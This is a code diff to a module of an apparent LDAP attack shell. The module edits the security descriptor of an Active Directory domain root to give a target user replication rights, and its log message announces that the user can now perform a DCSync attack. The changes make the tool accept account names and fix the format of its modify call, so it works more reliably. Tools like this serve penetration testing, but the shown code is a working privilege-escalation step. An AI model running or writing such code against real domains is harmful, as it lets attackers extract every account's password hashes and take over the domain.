@@ -40,13 +40,14 @@ class LdapShellModule(BaseLdapModule):
         self.log = log or logging.getLogger('ldap-shell.shell')
 
     def __call__(self):
-        if not LdapUtils.check_dn(self.client, self.domain_dumper, self.args.target):
-            self.log.error('Invalid DN: %s', self.args.target)
+        # Resolve target to DN (supports both DN and sAMAccountName)
+        user_dn = LdapUtils.get_dn(self.client, self.domain_dumper, self.args.target)
+        if not user_dn:
+            self.log.error('Target object not found: %s', self.args.target)
             return
 
         ldap_attribute = 'nTSecurityDescriptor'
         target_dn = self.domain_dumper.root
-        user_dn = self.args.target
         sd_data, domain_root_sid = LdapUtils.get_info_by_dn(self.client, self.domain_dumper, target_dn)
         _, user_sid = LdapUtils.get_info_by_dn(self.client, self.domain_dumper, user_dn)
         
@@ -69,7 +70,7 @@ class LdapShellModule(BaseLdapModule):
 
         if len(sd['Dacl'].aces) > 0:
             attr_values.append(sd.getData())
-        self.client.modify(target_dn, {ldap_attribute: [MODIFY_REPLACE, attr_values]}, controls=security_descriptor_control(sdflags=0x04))
+        self.client.modify(target_dn, {ldap_attribute: [(MODIFY_REPLACE, attr_values)]}, controls=security_descriptor_control(sdflags=0x04))
 
         if self.client.result['result'] == 0:
             self.log.info(f'DACL modified successfully! {user_name} now has DS-Replication privilege and can perform DCSync attack!')
